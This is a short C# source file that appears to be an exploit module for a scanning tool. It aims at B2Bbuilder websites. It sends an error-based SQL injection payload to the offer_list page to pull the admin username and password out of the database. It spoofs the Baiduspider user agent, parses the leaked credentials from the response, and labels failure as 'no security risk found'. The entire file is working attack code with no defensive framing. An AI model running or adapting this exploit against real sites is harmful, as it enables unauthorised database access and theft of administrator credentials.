using System;
using System.Net;
using System.Text;
namespace windowsmanger
{
	internal class B2Bbuilder
	{
		public string exp(string url)
		{
			string result;
			try
			{
				string urls = url;
				if (!urls.Contains("http://"))
				{
					urls = "http://" + urls;
				}
				string exp = "/?m=offer&s=offer_list&id=1004+and%28select+1+from%28select+count%28*%29%2Cconcat%28%28select+%28select+%28select+concat%280x27%2C0x7e%2Cb2bbuilder_admin.user,0x27,password%2C0x27%2C0x7e%29+from+%60b2bbuilder%60.b2bbuilder_admin+Order+by+user+limit+0%2C1%29+%29+from+%60information_schema%60.tables+limit+0%2C1%29%2Cfloor%28rand%280%29*2%29%29x+from+%60information_schema%60.tables+group+by+x%29a%29+and+1%3D1";
				string scrString = new WebClient
				{
					Headers = 
					{

						{
							"user-agent",
							"Baiduspider"
						}
					},
					Encoding = Encoding.Default
				}.DownloadString(urls + exp);
				int kaishi = scrString.IndexOf("~");
				string shuju = scrString.Substring(kaishi + 1, 50);
				string jieguo = shuju.Substring(0, shuju.IndexOf("~"));
				result = jieguo;
			}
			catch
			{
				result = "网站未发现安全隐患";
			}
			return result;
		}
	}
}
